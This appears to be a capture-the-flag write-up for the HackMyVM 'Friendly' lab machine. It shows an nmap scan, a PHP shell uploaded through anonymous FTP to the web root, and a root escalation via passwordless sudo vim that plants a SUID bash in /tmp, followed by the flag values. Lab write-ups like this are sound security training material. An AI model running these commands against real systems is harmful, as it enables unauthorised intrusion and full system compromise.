# Friendly 1

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.155:21
Open 10.0.2.155:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.155
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
```
:::

## FTP (Anonymous)

```bash
└─$ ftp anonymous@10.0.2.155
Password:
ftp> get index.html
226 Transfer complete
ftp> put nmap_scan_10.0.2.155
226 Transfer complete
ftp> put shell.php
ftp> exit
```

```bash
└─$ cat index.html
...
<!--   --- __  ---   -->
```

## HTTP (80)

Same file on FTP
```bash
└─$ diff index.html <(curl -so- http://10.0.2.155/)
```

### RCE

![writeup.png](/assets/pentest/hackmyvm/friendly/writeup.png)

## Privilege Escalation

```bash
www-data@friendly:/var/www# find /home -ls
   391682      4 drwxr-xr-x   3 root     root         4096 Feb 21  2023 /home
   391697      4 drwxr-xr-x   5 RiJaba1  RiJaba1      4096 Mar 11  2023 /home/RiJaba1
   391702      0 lrwxrwxrwx   1 RiJaba1  RiJaba1         9 Feb 23  2023 /home/RiJaba1/.bash_history -> /dev/null
   391698      4 drwxr-xr-x   2 RiJaba1  RiJaba1      4096 Mar 11  2023 /home/RiJaba1/CTF
   391706      4 -r--r--r--   1 RiJaba1  RiJaba1        21 Mar 11  2023 /home/RiJaba1/CTF/...
   391705      4 -r--r--r--   1 RiJaba1  RiJaba1        33 Mar 11  2023 /home/RiJaba1/user.txt
   391700      4 drwxr-xr-x   2 RiJaba1  RiJaba1      4096 Mar 11  2023 /home/RiJaba1/Private
   391704      4 -r--r--r--   1 RiJaba1  RiJaba1        45 Mar 11  2023 /home/RiJaba1/Private/targets.txt
   391699      4 drwxr-xr-x   2 RiJaba1  RiJaba1      4096 Feb 21  2023 /home/RiJaba1/YouTube
   391701      4 -r--r--r--   1 RiJaba1  RiJaba1        41 Feb 21  2023 /home/RiJaba1/YouTube/ideas.txt
```

```bash
www-data@friendly:/var/www# cat /home/RiJaba1/YouTube/ideas.txt
What are you reading? Have you hacked me?

www-data@friendly:/var/www# cat /home/RiJaba1/Private/targets.txt
U2hlbGxEcmVkZAp4ZXJvc2VjCnNNTApib3lyYXMyMDAK

www-data@friendly:/var/www# cat /home/RiJaba1/Private/targets.txt | base64 -d
ShellDredd
xerosec
sML
boyras200
```

Targets as password failed
```bash
www-data@friendly:/var/www# timeout 1 echo TARGETS | su - RiJaba1 -c id
Password: su: Authentication failure
```

Why does `www-data` have sudo...
```bash
www-data@friendly:/home/RiJaba1# sudo -l
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

- [https://gtfobins.github.io/gtfobins/vim/#sudo](https://gtfobins.github.io/gtfobins/vim/#sudo)

```bash
www-data@friendly:/home/RiJaba1# sudo vim -c ':!/bin/bash -c "install -m4777 /bin/bash /tmp/rootbash"'
www-data@friendly:/home/RiJaba1# /tmp/rootbash -p -c 'id'
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

## Flags

```bash
www-data@friendly:/home/RiJaba1# cat user.txt
b8cff8c9008e1c98a1f2937b4475acd6

www-data@friendly:/home/RiJaba1# /tmp/rootbash -p -c 'cat /root/root.txt'
Not yet! Find root.txt.

www-data@friendly:/home/RiJaba1# /tmp/rootbash -p -c 'find / -name root.txt -ls 2>/dev/null'
   261261      4 -r--------   1 root     root           33 Mar 11  2023 /var/log/apache2/root.txt
   919257      4 -r--------   1 root     root           24 Mar 11  2023 /root/root.txt

www-data@friendly:/home/RiJaba1# /tmp/rootbash -p -c 'cat /var/log/apache2/root.txt'
66b5c58f3e83aff307441714d3e28d2f
```